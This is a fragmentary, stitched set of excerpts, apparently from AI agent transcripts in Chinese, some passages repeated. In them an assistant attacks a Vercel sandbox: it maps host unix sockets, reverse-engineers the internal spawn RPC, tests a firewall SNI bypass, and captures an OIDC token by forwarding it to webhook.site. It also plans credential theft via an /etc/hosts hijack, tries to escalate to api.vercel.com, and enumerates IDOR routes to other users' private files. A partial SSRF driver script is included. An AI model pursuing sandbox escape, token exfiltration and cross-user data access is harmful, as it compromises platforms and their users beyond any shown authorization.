+` 收到 `HTTP/1.1 400 Bad Request`——**sandbox-init 是一个 HTTP 服务**，用户进程可直接连接
+2. **`/proc/net/unix` 暴露宿主 socket 列表**：`/run/cell/cell.sock`（celld！）、`/run/containerd/containerd.sock`、`/run/apm/apm.sock`、`/run/metrics/metrics.sock`——**沙箱能看到宿主的 unix socket**（共享 net ns 或 /proc/net 未隔离），这些路径在沙箱文件系统不可见（/run/cell NOT FOUND）
+3. **sandbox-init 是 16MB Go 二进制**，命令行带 `--pu
+-----
+nt","message":{"content":[{"type":"text","text":"**突破性进展**：
+
+- **23456 是 HTTP 服务**：发 `ping\
+` 直接收到 `HTTP/1.1 400 Bad Request`（和 init.sock 同款响应！）——**23456 可能就是 sandbox-init 的 TCP 控制端口**（`100.64.75.134:23456 ← 100.64.1.0:49194` ESTAB 是宿主 celld 连入的连接）
+- 30001/30002 可连接但不响应/立即断开——身份待定
+- **init.sock 路由暴力 8781 个候选全部 404** → 结论：**不是 HTTP/1.1 路由，是 gRPC（HTTP/2）服务**！J39 的 gRPC 探测因 bug 没跑成，必须用真 HTTP/2 客户端
+
+下一步 exp_j42：**工具可用性侦察 + 二进制端口字符串定位 + HTTP/2 连接尝试**：
+-----
+,"message":{"content":[{"type":"text","text":"**突破口！** 二进制字符串揭示了：
+
+1. **proto 包名：`vercel.sandbox.spawn.v1`**，消息 `SpawnRequest` 字段：`command`、`arguments`、`environment`...
+2. **`Connect-Protocol-Version` 头 + connect-go 字符串**——这是 **connect-go RPC 框架**！支持 **HTTP/1.1 + JSON**（Connect 协议），不需要 HTTP/2！
+3. `grpc.status.v1.Status`、`invalid signature` 等确认
+
+之前全部 404 是因为用错协议+错路径。下一步 exp_j50：**提取完整 proto 服务/方法名 + 用 Connect JSON 协议调用**："}]}}
+{"role":"assistant",
+################ 465c8d42 (12 hits) ################
+-----
+CMP 面关闭（custom/deny-all 全拦截，仅 allow-all 放行且无额外价值）。
+
+现在转向**最高价值假设**：OIDC token 的 `aud` 跟随 forwardURL——如果配置 `forwardURL=https://api.vercel.com`，防火墙会附加 **aud=api.vercel.com 的 OIDC token** 转发给 Vercel API。之前 aud=httpbin.org 的 token 调 API 全 403，但**如果 API 验证只检查 aud 是否为自己的域名**，沙箱内代码就能获得有效的 API 身份 → 提权链！"}
+-----
+了)
+- **[C] 双SNI[attacker.inv, example.com] → CLOSE**([C] 第一个 SNI 不匹配 → 拒绝)——说明防火墙取**第一个 SNI** 判断,但我的 CH 还有解码问题(openssl/curl 能过,我的不能)
+- **[E]-[H] 我的 probe 逻辑错了**:`pre_recv=True` 时先 recv 再 send,防火墙 1 秒等不到数据直接 FIN,SSLRequest 根本没发出去
+
+现在写 diag2:在沙箱内起本地 `openssl s_server`(回环不受防火墙影响),用它的 `-msg` 日志验证我的 ClientHello 与 openssl 标准 CH 的差异:"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"`s_server` 没起来——`pkill -f s_server` 把自己的父 bash 也杀了(
+-----
+role":"assistant","message":{"content":[{"type":"text","text":"**转发成功**（沙箱收到 webhook.site 的默认页面）！webhook 读取 API 格式问题，直接 curl 查看捕获内容："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"**OIDC token 完整捕获！**（aud=webhook.site、含 team/project/sandbox claims、24h 有效、出口 IP 100
+-----
+不一致)、Postgres 特殊握手、协议伪装。"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"[5][6] 有重大信号:Postgres SSLRequest 在**任意端口**(443 和 5432)都返回 `'S'`(0x53,服务器支持 SSL)——防火墙把 Postgres 握手当特殊协议处理了。这可能是不校验 SNI 的通道!先构造完整 ClientHello 让 TLS 测试可用,再测 Postgres 链。"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"输出又为空,检查沙箱状态。"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"
+-----
+ /tmp 与 Windows python 不一致)。改用相对路径。"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"Postgres 链:SSLRequest 在任意端口都回 `'S'`,但 TLS 握手无响应(上游 example.com:5432 无服务)。先修复脚本 bug 重测双 SNI。"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"直接在本地调试脚本,修复后重新部署。"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","te
+-----
+*TLS handshake 长度字段是 3 字节,我用了 4 字节 `>I`**,多出一个字节导致防火墙解析 ClientHello 失败 → 视为"不可识别流量"→ 拒绝。这同时解释了之前为什么 Postgres `SSLRequest`(8 字节固定格式)能回 'S' 而 TLS 链一直失败。
+
+修复:"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"重跑完整测试矩阵:"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"重大进展
+-----
+断,但我的 CH 还有解码问题(openssl/curl 能过,我的不能)
+- **[E]-[H] 我的 probe 逻辑错了**:`pre_recv=True` 时先 recv 再 send,防火墙 1 秒等不到数据直接 FIN,SSLRequest 根本没发出去
+
+现在写 diag2:在沙箱内起本地 `openssl s_server`(回环不受防火墙影响),用它的 `-msg` 日志验证我的 ClientHello 与 openssl 标准 CH 的差异:"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"`s_server` 没起来——`pkill -f s_server` 把自己的父 bash 也杀了(命令行里含 "s_server" 字样)。用 `s_serve
+-----
+"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"重写测试矩阵:整体包进 `__main__` 保护,同时把 PG 链测试改为正确的"先发 SSLRequest 再收"顺序:"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"现在写 openssl CH 对比脚本:"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","
+-----
+**实际是 20 字节**(type 2 + extlen 2 + data 16),留了一个错位字节 → 整个 CH 结构偏移 → 防火墙 decode_error。这就是之前一切混乱的根源
+- **[E]/[F] PG 链**:SSLRequest 都回 `PG-OK`,随后 TLS 阶段因坏 CH 全部失败——需要用有效 CH 重测
+
+修复截断长度:"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"[A] 仍 decode_error——`old_len` 计算错了:**扩展实际长度 = 4 + extlen 字段值**(type 2B + extlen 2B +
+-----
+xt","text":"**重大发现!端口保留实验:**
+- **[A] 8443 → ServerHello**(example.com:8443 有 TLS 服务)
+- **[B] 8080 → `HTTP/1.1 400 Bad Request / Server: cloudflare`** —— 明文响应!防火墙把 TLS 请求转发到了 **example.com:8080**(保留端口)
+- **[C]/[D] 22/53 → 超时**(example.com 无服务)
+- **[F]/[G]/[H] PG 明文 StartupMessage → 全部 RST** —— PG 模式**强制 TLS**(与文档一致,明文被 RST)
+
+转发模型最终确认:**防火墙完全忽略客户端目标 IP,按 SNI 域名 + 保留目标端口,自己建立新连接转发**。黑孔实验已证明这一点。
+
+现在进入**最高价值实验 B(/etc/hosts 劫持 + transform 凭据窃取)**。先读缓存文
+-----
+n1. **matchers 字段名是 `match`**（文档 line 154/156："a rule without `match`"）——之前用 `matchers` 被拒，试 `match`
+2. **forwardURL（Requests proxying）**：转发时自动附加 `vercel-forwarded-host/scheme/port/path` + **`vercel-sandbox-oidc-token`**（Vercel 签发 OIDC token，含 team_id/project_id/sandbox_id）——这可以**用 httpbin echo 当接收端验证**，不需要公网服务器！
+3. **TLS 终止只发生在有 transform/forwardURL 规则的域名**
+4. match 维度细节：path 大小写敏感、queryString AND+大小写、headers 名称不敏感/值敏感、exact/startsWith/regex(RE2
+-----
+":"ICMP 面关闭（custom/deny-all 全拦截，仅 allow-all 放行且无额外价值）。
+
+现在转向**最高价值假设**：OIDC token 的 `aud` 跟随 forwardURL——如果配置 `forwardURL=https://api.vercel.com`，防火墙会附加 **aud=api.vercel.com 的 OIDC token** 转发给 Vercel API。之前 aud=httpbin.org 的 token 调 API 全 403，但**如果 API 验证只检查 aud 是否为自己的域名**，沙箱内代码就能获得有效的 API 身份 → 提权链！"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"503 awselb = 请求**到达了 api.vercel.com 的 ELB** 但 Host 头是 httpbin.org（防火墙保留原始 Host）
+################ 6a5402ab (4 hits) ################
+-----
+**。先看 j101/102 现成的 h2 客户端实现，复用其帧构造："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"j102 确认沙箱里有 **curl + --http2-prior-knowledge**——K4 直接上 curl 对 30001/23456 做 gRPC/connect 方法面审计（reflection 枚举 + health + 内容类型语义），零 API 成本："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"输出被截断，看头部关键结果（reflection/health）："}]}}
+{"role":"assistant","message":{"content":[{"t
+-----
+n、**ssoConfig**、pwdConfig、publishedByUser |
+| **UserLicensesForFile** | fileKey+userId | 任意用户在某文件的许可 |
+| **AccountTypeRequestByIdView** | requestId(bigint) | 账户变更请求（递增可枚举！） |
+| **WebFontsForFile** | fileKey | signedFontFileUrl（签名 URL） |
+| **ResolvedComments** | fileKey | 已解决评论 |
+| WeaveEditLock/Presence | fileKey | 编辑锁/在线状态 |
+
+写批量探测脚本（单 WS 会话多订阅，纯净 B 攻 A 私有文件 + owner 基线 + 匿名对照）："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text"
+-----
+9a30-2b3ce0d03b20**。三路并进验证：①UserLicenses 绑定语义 ②**UsageBucketsView 用 A 的 planUserRecordId 查计费桶**（无用户绑定 view！）③AccountTypeRequestByIdView 递增 ID 枚举："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"重要修正：AccountTypeRequestByIdView 的 requestId 必须传**字符串** bigint（`expected string repre
+-----
+ountTypeRequestByIdView 递增 ID 枚举："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"重要修正：AccountTypeRequestByIdView 的 requestId 必须传**字符串** bigint（`expected string representation of bigint`）——这是可枚举 ID 的 IDOR 候选！立即用字符串重试枚举："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"rid 1-30 全空（ID 可能基数大或功能低频，无法实证）。回到 150 候选列表，发现高价值双 ID 注入：**PlanUserByTeamIdAndUserId
+################ 3d4619a8 (5 hits) ################
+-----
+)
+    18→    return sid
+    19→
+    20→def api(method, path, body=None):
+    21→    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
+    22→    req.add_header("Authorization", f"Bearer {TOKEN}")
+    23→    req.add_header("Content-Type", "application/json\
+-----
+y#L1-L74
+```
+     1→# 本地驱动: 逐轮 update forwardURL 目标 -> 沙箱请求, 测 SSRF
+     2→import json, base64, pathlib, urllib.request, urllib.error, sys
+     3→
+     4→TOKEN = "<REDACTED_VERCEL_TOKEN>"  # redacted: real PAT was committed by mistake and rotated
+     5→TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
+     6→PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"
+     7→
+     8→# 重新创建沙箱(超时停止后需重建)
+     9→def fresh_sandbox(name):
+    10→    api("DELETE", f"/v2/sandboxes/{name}?teamId={TEAM}\u0
+-----
+print("sid:", sid)
+    18→    return sid
+    19→
+    20→def api(method, path, body=None):
+    21→    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
+    22→    req.add_header("Authorization", f"Bearer {TOKEN}")
+    23→    req.add_header("Content-Type", "application/json")
+    24→    data = json.dumps(body).encode() if body is not None else None
+    25→    try:
+    26→        with urllib.request.urlopen(req, data=data,
+-----
+n    24→    data = json.dumps(body).encode() if body is not None else None
+    25→    try:
+    26→        with urllib.request.urlopen(req, data=data, timeout=60) as r:
+    27→            return r.status, r.read().decode()
+    28→    except urllib.error.HTTPError as e:
+    29→        return e.code, e.read().decode()[:600]
+    30→
+    31→SID = fresh_sandbox("expe3")
+    32→
+    33→def run_round(label, fwd_url, match_path, req_path):
+    34→    prin
+-----
+→
+    33→def run_round(label, fwd_url, match_path, req_path):
+    34→    print(f"\
+########## ROUND {label}: forwardURL={fwd_url} match={match_path} ##########", flush=True)
+    35→    c, r = api("POST", f"/v2/sandboxes/sessions/{SID}/network-policy?teamId={TEAM}",
+    36→               {"allow": {"httpbin.org": [{"match": {"path": {"exact": match_path}},
+    37→                                            "forwardURL": fwd_url}]}})
+    38→    if 
+################ 16ba677c (1 hits) ################
+-----
+许（EINVAL 参数无效）、userfaultfd **fd=3 创建成功**、memfd_secret **创建成功**
+- **IUR**：io_uring_setup **fd=3 成功**（sq=2 cq=4）、add_key/request_key/keyctl 全部允许
+- seccomp syscall 允许（EINVAL 因已有 filter）
+
+**沙箱进程有全 caps + 这些原语 = 特权攻击面**！最关键未测：**mount 真实能力**（J287l 的 mount e=14 只是 NULL 参数 EFAULT，说明 syscall 未被拒！）。写 J287x：mountinfo 全文 + /dev 设备 + 真实 mount + BPF_PROG_LOAD："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"继续。刚才 J287m 被你取消了（终端中断），我改成了更小的
